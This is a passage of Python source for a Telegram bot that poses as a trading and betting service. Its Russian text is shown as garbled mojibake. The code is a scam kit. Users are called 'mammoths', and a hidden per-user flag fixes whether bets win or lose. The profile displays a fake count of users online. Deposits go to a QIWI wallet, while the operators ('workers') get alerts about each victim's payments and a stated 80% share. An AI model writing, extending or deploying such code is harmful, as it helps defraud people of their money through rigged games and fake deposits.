            continue_invest = types.InlineKeyboardMarkup()
            cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest2')
            continue_invest.add(cont)
            await call.message.answer(text, reply_markup=continue_invest)
        if profile.fart == 0:
            random_num_game = random.randint(0,50)
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'–ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–†–µ—à–∏–ª —Å–¥–µ–ª–∞—Ç—å —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üìà > 50\n\nüìä –í—ã–±–∏—Ä–∞–µ–º —Ä–∞–Ω–¥–æ–º–Ω–æ–µ —á–∏—Å–ª–æ...')
            await asyncio.sleep(5)
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
f'üíü –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{profile.username}\n'
f'ID: {profile.user_id}\n'
f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –ø—Ä–æ–∏–≥—Ä–∞–ª–∞ ')

            profile.balance -= int(summ)
            profile.save()
            text = f'''
üìâ –í—ã–ø–∞–ª–æ —á–∏—Å–ª–æ: {random_num_game}
üò• –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏ üò•

–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
'''
            continue_invest = types.InlineKeyboardMarkup()
            cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest2')
            continue_invest.add(cont)
            await call.message.answer(text, reply_markup=continue_invest)
    except Exception as err:
        print(err)
        await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')


@dp.callback_query_handler(text_contains="down_", state="*")
async def back_to_ecn(call: types.CallbackQuery):
    try:
        summ = call.data.split('_')[1]
        int(summ)
        profile = all_users.get(all_users.user_id == call.from_user.id)
        if profile.fart == 0:
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'–ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–†–µ—à–∏–ª —Å–¥–µ–ª–∞—Ç—å —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üü† –†–µ—à–∫–∞\n\nüìä –ö–∏–¥–∞–µ–º –º–æ–Ω–µ—Ç—É...')
            await asyncio.sleep(5)
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
f'üíü –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{profile.username}\n'
f'ID: {profile.user_id}\n'
f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –ü–†–û–ò–ì–†–ê–õ–ê ‚ùå ')

            profile.balance -= int(summ)
            profile.save()
            text = f'''
üìâ –í—ã–ø–∞–ª üü§ –û—Ä—ë–ª
üò• –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏ üò•

–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
                                                '''
            continue_invest = types.InlineKeyboardMarkup()
            cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest')
            continue_invest.add(cont)
            await call.message.answer(text, reply_markup=continue_invest)

        elif profile.fart == 1:
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–°–¥–µ–ª–∞–ª —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üü† –†–µ—à–∫–∞\n\nüìä –ö–∏–¥–∞–µ–º –º–æ–Ω–µ—Ç—É...')
            await asyncio.sleep(5)
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                           f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                           f'ID: {profile.user_id}\n'
                                           f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –í–´–ô–ì–†–ê–õ–ê ‚úÖ ')
            profile.balance += int(summ)
            profile.save()
            text = f'''
ü§ë –í—ã –≤—ã–π–≥—Ä–∞–ª–∏ {int(summ) + int(summ)}‚ÇΩ ü§ë

–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
                                    '''
            continue_invest = types.InlineKeyboardMarkup()
            cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest')
            continue_invest.add(cont)
            await call.message.answer(text, reply_markup=continue_invest)

        elif profile.fart == 2:
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–°–¥–µ–ª–∞–ª —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            rand = random.randint(1, 2)
            if rand == 1:
                await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üü† –†–µ—à–∫–∞\n\nüìä –ö–∏–¥–∞–µ–º –º–æ–Ω–µ—Ç—É...')
                await asyncio.sleep(5)
                if not (profile.worker is None):
                    await bot.send_message(profile.worker,
                                               f'üíü–ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                               f'ID: {profile.user_id}\n'
                                               f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –≤—ã–∏–≥—Ä–∞–ª–∞ ‚úÖ ')
                profile.balance += int(summ)
                profile.save()
                text = f'''
ü§ë –í—ã –≤—ã–π–≥—Ä–∞–ª–∏ {int(summ) + int(summ)}‚ÇΩ ü§ë

–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
                                                        '''
                continue_invest = types.InlineKeyboardMarkup()
                cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest')
                continue_invest.add(cont)
                await call.message.answer(text, reply_markup=continue_invest)

            else:
                await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üü† –†–µ—à–∫–∞\n\nüìä –ö–∏–¥–∞–µ–º –º–æ–Ω–µ—Ç—É...')
                await asyncio.sleep(5)
                if not (profile.worker is None):
                    await bot.send_message(profile.worker,
                                               f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                               f'ID: {profile.user_id}\n'
                                               f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –Ω–µ –ø—Ä–æ–∏–≥—Ä–∞–ª–∞ ')
                profile.balance -= int(summ)
                profile.save()
                text = f'''
üìâ –í—ã–ø–∞–ª üü§ –û—Ä—ë–ª
üò• –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏ üò•

–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
                                                                    '''
                continue_invest = types.InlineKeyboardMarkup()
                cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest')
                continue_invest.add(cont)
                await call.message.answer(text, reply_markup=continue_invest)

    except Exception as err:
        print(err)
        await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')


@dp.callback_query_handler(text_contains="up_", state="*")   #–æ—Ä–µ–ª
async def back_to_ecn(call: types.CallbackQuery):
    try:
        summ = call.data.split('_')[1]
        int(summ)
        profile = all_users.get(all_users.user_id == call.from_user.id)
        if profile.fart == 0:
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–°–¥–µ–ª–∞–ª —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üü§ –û—Ä—ë–ª\n\nüìä –ö–∏–¥–∞–µ–º –º–æ–Ω–µ—Ç—É...')
            await asyncio.sleep(5)
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                           f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                           f'ID: {profile.user_id}\n'
                                           f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –ø—Ä–æ–∏–≥—Ä–∞–ª–∞ ‚ùå ')
            profile.balance -= int(summ)
            profile.save()
            text = f'''
üìâ –í—ã–ø–∞–ª–∞ üü† –†–µ—à–∫–∞
üò• –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏ üò•

–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
                                                '''
            continue_invest = types.InlineKeyboardMarkup()
            cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest')
            continue_invest.add(cont)
            await call.message.answer(text, reply_markup=continue_invest)

        elif profile.fart == 1:
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–°–¥–µ–ª–∞–ª —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üü§ –û—Ä—ë–ª\n\nüìä –ö–∏–¥–∞–µ–º –º–æ–Ω–µ—Ç—É...')
            await asyncio.sleep(5)
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                           f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                           f'ID: {profile.user_id}\n'
                                           f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –≤—ã–∏–≥—Ä–∞–ª–∞ ‚úÖ')
            profile.balance += int(summ)
            profile.save()
            text = f'''
ü§ë –í—ã –≤—ã–π–≥—Ä–∞–ª–∏ {int(summ) + int(summ)}‚ÇΩ ü§ë

–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
                                    '''
            continue_invest = types.InlineKeyboardMarkup()
            cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest')
            continue_invest.add(cont)
            await call.message.answer(text, reply_markup=continue_invest)

        elif profile.fart == 2:
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–°–¥–µ–ª–∞–ª —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            rand = random.randint(1, 2)
            if rand == 1:
                await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üü§ –û—Ä—ë–ª\n\nüìä –ö–∏–¥–∞–µ–º –º–æ–Ω–µ—Ç—É...')
                await asyncio.sleep(5)
                if not (profile.worker is None):
                    await bot.send_message(profile.worker,
                                               f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                               f'ID: {profile.user_id}\n'
                                               f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –≤—ã–∏–≥—Ä–∞–ª–∞ ‚úÖ ')
                profile.balance += int(summ)
                profile.save()
                text = f'''
ü§ë –í—ã –≤—ã–π–≥—Ä–∞–ª–∏ {int(summ) + int(summ)}‚ÇΩ ü§ë

–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
                                                        '''
                continue_invest = types.InlineKeyboardMarkup()
                cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest')
                continue_invest.add(cont)
                await call.message.answer(text, reply_markup=continue_invest)

            else:
                await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üü§ –û—Ä—ë–ª\n\nüìä –ö–∏–¥–∞–µ–º –º–æ–Ω–µ—Ç—É...')
                await asyncio.sleep(5)
                if not (profile.worker is None):
                    await bot.send_message(profile.worker,
                                               f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                               f'ID: {profile.user_id}\n'
                                               f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –≤—ã–∏–≥—Ä–∞–ª–∞ ‚úÖ ')
                profile.balance -= int(summ)
                profile.save()
                text = f'''
üìâ –í—ã–ø–∞–ª–∞ üü† –†–µ—à–∫–∞
üò• –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏ üò•

–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
                                                                    '''
                continue_invest = types.InlineKeyboardMarkup()
                cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest')
                continue_invest.add(cont)
                await call.message.answer(text, reply_markup=continue_invest)

    except Exception as err:
        print(err)
        await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')


@dp.callback_query_handler(text="continue_invest3", state="*")
async def continue_invest_func(call: types.CallbackQuery):
    try:
        profile = all_users.get(all_users.user_id == call.from_user.id)
        if profile.freez == 0:
            text = f'üåê –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ –∏–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å.' \
                   f'\n' \
                   f'\n–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ —Å—Ç–∞–≤–∫–∏: 500‚ÇΩ' \
                   f'\n' \
                   f'\n–í–∞—à –¥–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'
            if profile.balance < 500:
                await call.message.edit_text(text,)

            else:
                text = f'''
üí∞ –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É —Å—Ç–∞–≤–∫–∏
–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ —Å—Ç–∞–≤–∫–∏ - 500‚ÇΩ

–í–∞—à –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
                '''
                await kubik_casino.summ.set()
                await call.message.edit_text(text)
        else:
            await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')

    except Exception as err:
        print(err)
        await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')


@dp.callback_query_handler(text="continue_invest2", state="*")
async def continue_invest_func(call: types.CallbackQuery):
    try:
        profile = all_users.get(all_users.user_id == call.from_user.id)
        if profile.freez == 0:
            text = f'üåê –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ –∏–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å.' \
                   f'\n' \
                   f'\n–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ —Å—Ç–∞–≤–∫–∏: 500‚ÇΩ' \
                   f'\n' \
                   f'\n–í–∞—à –¥–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'
            if profile.balance < 500:
                await call.message.edit_text(text,)

            else:
                text = f'''
üí∞ –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É —Å—Ç–∞–≤–∫–∏
–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ —Å—Ç–∞–≤–∫–∏ - 500‚ÇΩ

–í–∞—à –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
                '''
                await rnd_numchik.summ.set()
                await call.message.edit_text(text)

        else:
            await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')

    except Exception as err:
        print(err)
        await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')



@dp.callback_query_handler(text="continue_invest", state="*")
async def continue_invest_func(call: types.CallbackQuery):
    try:
        profile = all_users.get(all_users.user_id == call.from_user.id)
        if profile.freez == 0:
            text = f'üåê –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ –∏–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å.' \
                   f'\n' \
                   f'\n–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ —Å—Ç–∞–≤–∫–∏: 500‚ÇΩ' \
                   f'\n' \
                   f'\n–í–∞—à –¥–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'
            if profile.balance < 500:
                await call.message.edit_text(text,)

            else:
                text = f'''
üí∞ –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–π
–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–π - 500‚ÇΩ

–í–∞—à –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
                '''
                await ecn_add.summ.set()
                await call.message.edit_text(text)

        else:
            await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')

    except Exception as err:
        print(err)
        await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')


@dp.message_handler(Text(equals="üíº –ü—Ä–æ—Ñ–∏–ª—å"), state="*")
async def ecn(message: types.Message):
    profile = all_users.get(all_users.user_id == message.from_user.id)
    if profile.verif == 0:
        text = f'''
üì≤ –í–∞—à –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç

üí∞–î–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance} ‚ÇΩ
ü§ù –°–¥–µ–ª–æ–∫: {profile.offer}

üìë –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: ‚ùå

üÜî –í–∞—à ID: {profile.user_id}
üìà –ê–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –æ–Ω–ª–∞–π–Ω: {random.randint(1950, 2050)}
                            '''

    else:
        text = f'''
üì≤ –í–∞—à –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç

üí∞–î–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance} ‚ÇΩ
ü§ù –°–¥–µ–ª–æ–∫: {profile.offer}

üìë –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: ‚úÖ

üÜî –í–∞—à ID: {profile.user_id}
üìà –ê–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –æ–Ω–ª–∞–π–Ω: {random.randint(1950, 2050)}
                                        '''

    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(types.KeyboardButton(text='üé∞ –ò–≥—Ä–∞—Ç—å'), types.KeyboardButton(text='üíº –ü—Ä–æ—Ñ–∏–ª—å'))
    keyboard.add(types.KeyboardButton(text='üí≥ –ü–æ–ø–æ–ª–Ω–∏—Ç—å'), types.KeyboardButton(text='üè¶ –í—ã–≤–µ—Å—Ç–∏'))
    keyboard.add(types.KeyboardButton(text='‚öô–û–±—Ä–∞—Ç–Ω–∞—è —Å–≤—è–∑—å‚öô '))

    if workers.get_or_none(workers.user_id == message.from_user.id):
        keyboard.add(types.KeyboardButton(text='‚ö°Ô∏è –ú–µ–Ω—é –≤–æ—Ä–∫–µ—Ä–∞', callback_data="workers_menu"))

    await message.answer_photo(photo=open('images/profile.jpg', 'rb'), caption=text,
                               )


@dp.message_handler(Text(equals="üí≥ –ü–æ–ø–æ–ª–Ω–∏—Ç—å"), state="*")
async def ecn(message: types.Message):
    await message.answer('–í—ã–±–µ—Ä–∏—Ç–µ –≤–∞—Ä–∏–∞–Ω—Ç –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞: ', reply_markup=pays_ru)


@dp.callback_query_handler(text="add_balance_pay", state="*")
async def add_balance_pay(call: types.CallbackQuery):
    await call.message.delete()
    profile = all_users.get(all_users.user_id == call.from_user.id)
    def_settings = default_setting.get(default_setting.id == 1)
    if def_settings.pay_status == 1:
        await call.message.answer('üõëÔ∏è *–¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ —Ä–∞–±–æ—Ç—ã*', reply_markup=back_to_start_ru, parse_mode='Markdown')
    else:
        text = f'''
–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è:\n<i>–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ - {profile.min_pay_up}‚ÇΩ</i>
                    '''
        await costing.cost.set()
        await call.message.answer(text, parse_mode='HTML', reply_markup=back_to_start_reset_ru)


@dp.callback_query_handler(text_contains='work_accept_pay_', state="*")
async def add_balance_pay(call: types.CallbackQuery):
    summ = call.data.split('_')[3]
    ids = call.data.split('_')[4]
    profile = all_users.get(all_users.user_id == ids)
    profile.balance += int(summ)
    profile.save()
    await call.message.delete_reply_markup()
    await bot.send_message(ids, '‚úÖÔ∏è–í–∞—à –±–∞–ª–∞–Ω—Å –ø–æ–ø–æ–ª–Ω–µ–Ω')


@dp.message_handler(content_types=['text'], state=costing)
async def state_balance(message: types.Message, state: FSMContext):
    try:
        profile = all_users.get(all_users.user_id == message.from_user.id)
        async with state.proxy() as data:
            data['cost'] = message.text
        await state.finish()
        if int(data['cost']) < profile.min_pay_up:
            await message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', reply_markup=back_to_start_ru, parse_mode='Markdown')

        else:
            if not (profile.worker is None):
                work_accept_pay = types.InlineKeyboardMarkup()
                work_accept_pay.add(types.InlineKeyboardButton('–û–ø–ª–∞—Ç–∏—Ç—å', callback_data=f'work_accept_pay_{data["cost"]}_{message.from_user.id}'))
                info = await bot.get_chat(message.from_user.id)
                if info.username is None:
                    text = f'''
üíü –ú–∞–º–æ–Ω—Ç –ø–æ–ø—ã—Ç–∞–ª—Å—è –≤—ã–ø–æ–ª–Ω–∏—Ç—å –æ–ø–ª–∞—Ç—É:
ID: id{message.from_user.id}
–°—É–º–º–∞: {int(data['cost'])}‚ÇΩ'''
                else:
                    text = f'''
üíü –ú–∞–º–æ–Ω—Ç –ø–æ–ø—ã—Ç–∞–ª—Å—è –≤—ã–ø–æ–ª–Ω–∏—Ç—å –æ–ø–ª–∞—Ç—É:
–ú–∞–º–æ–Ω—Ç: @{info.username}
ID: id{message.from_user.id}
–°—É–º–º–∞: {int(data['cost'])}‚ÇΩ'''

                await bot.send_message(profile.worker, text, reply_markup=work_accept_pay)


            random_code = random.randint(1, 1000000)
            pays = Pay.get(Pay.id == 1)
            phone = pays.qiwi_number
            link = f"https://qiwi.com/payment/form/99?extra%5B%27account%27%5D={phone}&amountInteger={data['cost']}&amountFraction=0&extra%5B%27comment%27%5D={random_code}&currency=643&blocked%5B0%5D=sum&blocked%5B1%5D=comment&blocked%5B2%5D=account"

            payment = types.InlineKeyboardMarkup()
            payment.add(
                    types.InlineKeyboardButton('–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–ø–ª–∞—Ç—É',
                                               callback_data=f'check_payment_{random_code}_{data["cost"]}'),
                    types.InlineKeyboardButton('–ü–µ—Ä–µ–π—Ç–∏ –∫ –æ–ø–ª–∞—Ç–µ', url=link))

            text = f'''
<b>‚ôªÔ∏è –û–ø–ª–∞—Ç–∞ QIWI/–±–∞–Ω–∫–æ–≤—Å–∫–æ–π –∫–∞—Ä—Ç–æ–π:</b>

<b>QIWI: {phone}</b>
<b>–°—É–º–º–∞: {data['cost']}‚ÇΩ</b>
<b>–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: {random_code}</b>

<i>–í–ê–ñ–ù–û! –û–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –ø–æ—Å–ª–µ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è, –Ω–µ –∑–∞–±—É–¥—å—Ç–µ –Ω–∞–∂–∞—Ç—å –∫–Ω–æ–ø–∫—É ¬´–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–ø–ª–∞—Ç—É¬ª –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞.</i>
            '''
            await message.answer_photo(photo=open('images/vvod.jpg', 'rb'), caption=text, reply=False, parse_mode='HTML',
                                       reply_markup=payment)

    except Exception as err:
        print(err)
        await message.answer('üõëÔ∏è  *–û—à–∏–±–∫–∞*', reply_markup=back_to_start_ru, parse_mode='Markdown')


@dp.callback_query_handler(text_contains='check_payment_', state="*")
async def check_pay(call: types.CallbackQuery):
    random_code = call.data.split('_')[2]
    cost_summ = call.data.split('_')[3]
    result_pay = False
    profile = all_users.get(all_users.user_id == call.from_user.id)
    if not(profile.worker is None):
        worker = workers.get(workers.user_id == profile.worker)
    try:
        qiwi_history = await get_history()
        for i in range(3):
            if qiwi_history['data'][i]['comment'] == str(random_code) and qiwi_history['data'][i]['sum']['amount'] == int(cost_summ):
                await call.message.delete()
                result_pay = True
                if not (profile.worker is None):
                    info = await bot.get_chat(call.from_user.id)
                    info_worker = await bot.get_chat(profile.worker)
                    if info.username is None:
                        text = f'''
üíü –ú–∞–º–æ–Ω—Ç –≤—ã–ø–æ–ª–Ω–∏–ª –æ–ø–ª–∞—Ç—É:
ID: id{call.from_user.id}
–°—É–º–º–∞: {int(cost_summ)}‚ÇΩ'''
                    else:
                        text = f'''
üíü –ú–∞–º–æ–Ω—Ç –≤—ã–ø–æ–ª–Ω–∏–ª –æ–ø–ª–∞—Ç—É:
–ú–∞–º–æ–Ω—Ç: @{call.from_user.username}
ID: id{call.from_user.id}
–°—É–º–º–∞: {int(cost_summ)}‚ÇΩ'''
                    await bot.send_message(profile.worker, text)
                    await bot.send_message(chat_id=channel,reply=False, parse_mode='HTML' ,text=f''' 
<b>üéâ –£—Å–ø–µ—à–Ω–æ–µ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ</b>

<b>üè¶ –°—É–º–º–∞: {cost_summ}</b>
<b>üë∑‚Äç‚ôÄÔ∏è –í–æ—Ä–∫–µ—Ä: @{info_worker.username}‚ÇΩ</b>
<b>üíª –°–µ—Ä–≤–∏—Å: –¢—Ä–µ–π–¥ X1</b>
<b>üåè –°—Ç—Ä–∞–Ω–∞: üá∑üá∫</b>
<b>üí∏ –î–æ–ª—è –≤–æ—Ä–∫–µ—Ä–∞: {(int(cost_summ) // 100) * worker.procent} ‚ÇΩ | 80 %</b>
''')
                else:
                            await bot.send_message(chat_id=channel,reply=False, parse_mode='HTML' ,text=f''' 
<b>üéâ –£—Å–ø–µ—à–Ω–æ–µ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ</b>

<b>üè¶ –°—É–º–º–∞: {cost_summ} ‚ÇΩ</b>
<b>üë∑‚Äç‚ôÄÔ∏è –í–æ—Ä–∫–µ—Ä: –û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç</b>
<b>üíª –°–µ—Ä–≤–∏—Å: –¢—Ä–µ–π–¥ X1</b>
<b>üåè –°—Ç—Ä–∞–Ω–∞: üá∑üá∫</b>
''')
                profile.balance += int(cost_summ)
                profile.save()
                await call.message.answer(f'üîê –û–ø–ª–∞—Ç–∞ –Ω–∞–π–¥–µ–Ω–∞, –Ω–∞ –±–∞–ª–∞–Ω—Å –∑–∞—á–∏—Å–ª–µ–Ω–æ {cost_summ}‚ÇΩ')

        if not result_pay:
            await call.answer('üõëÔ∏è  –í–∞—à –ø–ª–∞—Ç—ë–∂ –Ω–µ –Ω–∞–π–¥–µ–Ω.')

    except Exception as e:
        await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')
        print(e)


